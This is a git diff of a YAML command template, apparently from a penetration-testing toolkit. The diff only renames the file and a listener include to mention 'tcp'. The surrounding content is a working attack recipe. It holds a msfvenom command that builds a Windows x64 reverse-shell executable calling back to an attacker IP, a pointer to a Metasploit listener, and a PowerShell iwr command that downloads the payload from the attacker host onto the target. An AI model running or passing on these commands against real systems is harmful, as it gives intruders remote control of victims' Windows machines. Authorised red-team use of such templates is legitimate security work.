@@ -1,6 +1,6 @@
 ---
 metadata:
-  filename: "deliver-windows-x64-revshell-msfvenom-nonstaged-exe.yaml"
+  filename: "deliver-windows-x64-revshell-msfvenom-tcp-nonstaged-exe.yaml"
   tags: ["shell", "windows"]
   created: "2025-03-29"
   authors: ["Unknown"]
@@ -10,7 +10,7 @@ content: |
   msfvenom -p windows/x64/shell_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \
   echo '================================================================'; \
   echo '                      ------Listener------                      '; \
-  echo 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-nonstaged.yaml') }}'; \
+  echo 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-tcp-nonstaged.yaml') }}'; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
   echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_inbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
